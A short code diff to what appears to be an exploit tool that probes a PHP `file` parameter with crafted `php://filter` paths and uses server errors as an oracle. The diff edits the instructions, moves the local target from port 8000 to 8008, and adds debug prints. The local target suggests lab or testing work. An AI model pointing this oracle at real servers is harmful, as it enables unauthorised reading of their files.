@@ -4,8 +4,8 @@ whether a path is empty or not.
 # INSTRUCTIONS
 
 Replace the dummy implementation of Remote.check_path() with a real one that fits your
-target. It should return FALSE when the given `php://filter` path causes an error, and
-TRUE otherwise.
+target. It should return TRUE when the given `php://filter` path causes an error, and
+FALSE otherwise.
 
 Use `./lighting.py test` to test your implementation.
 
@@ -51,10 +51,13 @@ class Remote:
         # Send request
         
         response = self.session.get(
-            "http://127.0.0.1:8000/index.php", params={"file": path}
+            "http://127.0.0.1:8008/index.php", params={"file": path}
         )
         
         # Check for errors
+        print("Response: ")
+        print(response.text)
+        print("=========")
         
         if response.code(500):
             return True
@@ -97,6 +100,7 @@ class Remote:
 
         # Use the `build_path` method to build the complete `php://filter` path.
         path = self._build_path(filters, resource)
+        print(path)
         return self.oracle(path)
 
     def _build_path(self, filters: list[str], resource: str) -> str:
